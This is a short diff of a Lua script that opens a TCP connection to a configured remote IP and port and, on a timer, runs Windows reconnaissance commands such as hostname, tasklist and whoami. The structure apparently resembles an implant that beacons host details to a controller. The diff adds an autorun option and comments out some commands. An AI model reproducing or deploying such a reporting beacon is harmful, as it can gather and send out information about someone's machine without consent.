@@ -2,8 +2,8 @@ package.path = path .. "?.lua"
 require("config")
 trace = config.trace
 period = config.period or 30
-
-local flag,s  = tcp_connect(config.ip,config.port)
+autorun = config.autorun or false
+local flag,s = tcp_connect(config.ip,config.port)
 
 --local cmds = {"tasklist","systeminfo","whoami","cmd.exe /C dir","cmd.exe /C echo %username%"}
 local cmds = {"whoami","cmd.exe /C dir","cmd.exe /C echo %username%"}
@@ -48,10 +48,11 @@ end
 
 
 function on_time()
-	exec_cmd("whoami","whoami")
+	--exec_cmd("whoami","whoami")
 	exec_cmd("hostname","hostname")
 	--exec_cmd("systeminfo","systeminfo")
 	exec_cmd("tasklist /V /NH /FO CSV ","tasklist")
+--	close_socket(s)
 end
 
 function on_quit()
